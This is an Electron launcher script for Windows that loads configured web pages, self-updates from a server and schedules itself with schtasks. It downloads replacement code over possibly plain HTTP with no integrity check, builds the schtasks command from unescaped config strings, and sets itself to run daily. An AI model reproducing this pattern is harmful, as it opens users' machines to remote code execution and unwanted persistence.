const { app, BrowserWindow, dialog, shell } = require("electron");
const stream = require("stream");
const fs = require("original-fs");
const electronFs = require("fs");
const http = require("http");
const https = require("https");
const exec = require("child_process").exec;
const os = require("os");

const CONFIG_NAME = "config.json";

var window = undefined;
var config;
var store;

app.once("newListener", debug);
app.on("ready", configure);
app.on("configured", restore);
	app.on("reset", init);
app.on("restored", check);
	app.on("outdated", download);
	app.on("updated", schedule);
	app.on("downloaded", replace);
app.on("scheduled", run);
app.on("runned", load);
app.on("loaded", show);

app.on("transition", transition);
app.on("window-all-closed", quit);
app.on("will-quit", save);

function debug(name, listener)
{
	app.on(name, () => {
		console.log(name);
	});
	app.once("newListener", debug);
}

function run()
{
	if (store.enabled)
		app.emit("runned");
	else
		quit();
}

function configure()
{
	if (app.makeSingleInstance((commandLine, workingDirectory) => {
		if (window)
		{
			if (window.isMinimized()) window.restore();
			window.focus();
		}
	}))
		app.quit();
	app.commandLine.appendSwitch('--disable-http-cache');
	electronFs.readFile(app.getAppPath() + "\\" + CONFIG_NAME, { encoding: "UTF-8" }, (error, data) => {
		config = JSON.parse(data);
		app.emit("configured");
	});
}

function schtasks(expr, callback)
{
	let task = exec(`schtasks /Create /TN ${config.schedule.task} ${expr} /TR ${process.execPath} /F`);
	task.once("exit", callback);
}

function schedule()
{
	if (config.schedule.schtasks !== "" && store.enabled)
	{
		schtasks(config.schedule.schtasks, (code, signal) => {
			app.emit("scheduled");
		});
	}
	else
		app.emit("scheduled");
}

function restore()
{
	fs.readFile(app.getPath("userData") + "\\" + config.store, { encoding: "UTF-8" }, (error, data) => {
		try
		{
			if (error)
				throw error;
			else
			{
				store = JSON.parse(data);
				if (store == "")
					throw error;
				app.emit("restored");
			}
		}
		catch (ex)
		{
			app.emit("reset");
		}
	});
}

function init()
{
	store = {
		step: config.entry,
		enabled: true
	};
	let request = http.request(Object.assign({ method: "HEAD" }, config.update.server), (version) => {
		if (version.statusCode > 199 && version.statusCode < 300)
			store.version = version.headers.etag;
		app.emit("restored");
	});
	request.once("error", (error) => {
		app.emit("restored");
	});
	request.end();
}

function check()
{
	let rqst = (config.update.server.protocol == 'http:') ? http : https;
	let request = rqst.request(Object.assign({ method: "HEAD" }, config.update.server), (response) => {
		if (response.statusCode < 200 || response.statusCode > 299) {
			app.emit("updated");
		}
		else
		{
			if (response.headers.etag != store.version)
			{
				app.once("replaced", () => {
					store.version = response.headers.etag;
					app.once("saved", () => {
						app.relaunch();
					});
					quit();
				});
				app.emit("outdated");
			}
			else
				app.emit("updated");
		}
	});
	request.once("error", (error) => {
		app.emit("updated");
	});
	request.end();
}

function download()
{
	let rqst = (config.update.server.protocol == 'http:') ? http : https;
	let local = fs.createWriteStream(app.getPath("userData") + "\\" + config.update.temp);
	let request = rqst.request(Object.assign({ method: "GET" }, config.update.server), (remote) => {
		if (remote.statusCode < 200 || remote.statusCode > 299)
			app.emit("updated");
		else
		{
			remote.pipe(local);
			local.once("error", (error) => {
				local.close();
				app.emit("updated");
			});
			local.once("finish", () => {
				app.emit("downloaded");
			});
		}
	});
	request.end();
}

function replace()
{
	let src = fs.createReadStream(app.getPath("userData") + "\\" + config.update.temp);
	let dest = fs.createWriteStream(app.getAppPath());
	src.pipe(dest);
	dest.once("finish", () => {
		app.emit("replaced");
	});
}

function load()
{
	window = new BrowserWindow({
		resizable: false,
		fullscreenable: false,
		show: false,
		title: config.title,
		icon: process.execPath + "\\icon.png",
		webPreferences: {
			devTools: false
		}
	});
	//window.webContents.openDevTools();
	window.setContentSize(config.width, config.height);
	window.webContents.on("will-navigate", (event, url) => {
		app.emit("transition", url);
	});
	window.loadURL(store.step);
	window.webContents.on("did-fail-load", (event, errorCode, errorDescription, validatedURL, isMainFrame) => {
		fs.writeFile(app.getPath("userData") + "\\" + config.store, JSON.stringify(store), { encoding: "UTF-8" }, (error) => {
			app.emit("saved");
			store.save = true;
			process.kill(process.pid, "SIGKILL");
		});
	});
	window.webContents.on("did-get-response-details", (event, status, newURL, originalURL, httpResponseCode, requestMethod, referrer, headers, resourceType) => {
		if (newURL == store.step && (httpResponseCode < 200 || httpResponseCode > 299))
		{
			window.webContents.stop();
			if (store.step == config.entry)
				window.webContents.emit("did-fail-load");
			else
			{
				app.emit("transition", config.entry);
				window.loadURL(config.entry);
			}
		}
	});
	window.webContents.once("did-finish-load", () => {
		window.webContents.send("hostname", os.hostname());
		app.emit("loaded");
	});
}

function show()
{
	dialog.showMessageBox({
		type: "info",
		buttons: [ config.messagebox.buttontext ],
		title: config.messagebox.title,
		message: config.messagebox.content
	}, (response, checkboxChecked) => {
		window.show();
		app.emit("shown");
	});
}

function transition(URL)
{
	if (URL.indexOf(config.final) !== -1)
	{
		shell.openExternal(URL, { activate: false }, (error) => {
			{
				store.enabled = false;
				schtasks("/SC DAILY", (a, b) => {
					quit();
				});
			}
		});
	}
	else
		store.step = URL;
}

function save(event)
{
	if (!store.save)
	{
		event.preventDefault();
		fs.writeFile(app.getPath("userData") + "\\" + config.store, JSON.stringify(store), { encoding: "UTF-8" }, (error) => {
			app.emit("saved");
			store.save = true;
			quit();
		});
	}
}

function quit()
{
	app.quit();
}